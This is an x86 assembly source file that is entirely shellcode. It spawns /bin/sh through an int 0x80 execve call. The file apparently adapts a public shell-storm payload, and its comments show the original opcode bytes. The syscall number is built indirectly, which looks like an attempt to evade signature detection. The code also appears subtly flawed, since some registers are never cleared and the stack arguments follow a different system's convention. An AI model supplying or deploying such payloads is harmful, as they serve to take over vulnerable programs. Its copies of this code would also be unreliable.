; Code borrowed from http://shell-storm.org/shellcode/files/shellcode-675.php
;  "\x99"                  /* cdq              */
;  "\x52"                  /* push %edx        */
;  "\x68\x6e\x2f\x73\x68"  /* push $0x68732f6e */
;  "\x68\x2f\x2f\x62\x69"  /* push $0x69622f2f */
;  "\x89\xe3"              /* movl %esp,%ebx   */
;  "\x51"                  /* push %ecx - or %edx :) */
;  "\x52"                  /* push %edx - or %ecx :) */
;  "\x53"                  /* push %ebx        */
;  "\x53"                  /* push %ebx        */
;  "\x6a\x3b"              /* push $0x3b       */
;  "\x58"                  /* pop %eax         */
;  "\xcd\x80";             /* int $0x80        */

global _start

section .text

_start:
	
	cdq
	push	edx
	push	0x68732f6e
	push	0x69622f2f
	mov		ebx, esp
	push	ecx
	push	edx
	push	ebx
	push	ebx
	mov		al, 0x5
	add		al, 0x5
	inc		al
	int		0x80
